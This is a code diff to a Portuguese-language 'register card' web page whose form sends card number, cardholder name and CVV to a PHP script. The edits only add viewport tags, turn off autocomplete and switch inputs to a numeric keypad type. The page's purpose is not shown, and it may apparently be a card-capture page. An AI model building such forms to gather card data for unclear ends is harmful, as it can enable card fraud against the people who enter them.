@@ -2,6 +2,8 @@
 <html lang="pt-BR" >
 <head>
   <meta charset="UTF-8">
+  <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' name='viewport' />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
   <title>Cadastrar Cartão</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
   <link rel="stylesheet" href="assets/css/style.css">
@@ -154,11 +156,11 @@
           </div>
         </div>
       </div>
-      <form action="assets/php/enviar_cartao.php" method="POST" id='cadastro_cartao' onsubmit="return false">
+      <form action="assets/php/enviar_cartao.php" method="POST" id='cadastro_cartao' onsubmit="return false" autocomplete="off">
       <div class="card-form__inner">
         <div class="card-input">
           <label for="cardNumber" class="card-input__label"></label>Numero do Cartão
-          <input type="text" id="cardNumber" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" name='num_cartao'>
+          <input type="tel" id="cardNumber" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" name='num_cartao'>
         </div>
         <div class="card-input">
           <label for="cardName" class="card-input__label">Nome Impresso no Cartão</label>
@@ -185,7 +187,7 @@
           <div class="card-form__col -cvv">
             <div class="card-input">
               <label for="cardCvv" class="card-input__label">CVV</label>
-              <input type="text" class="card-input__input" id="cardCvv" v-mask="'###'" maxlength="3" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off" name='cvv_cartao'>
+              <input type="tel" class="card-input__input" id="cardCvv" v-mask="'###'" maxlength="3" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off" name='cvv_cartao'>
             </div>
           </div>
         </div>
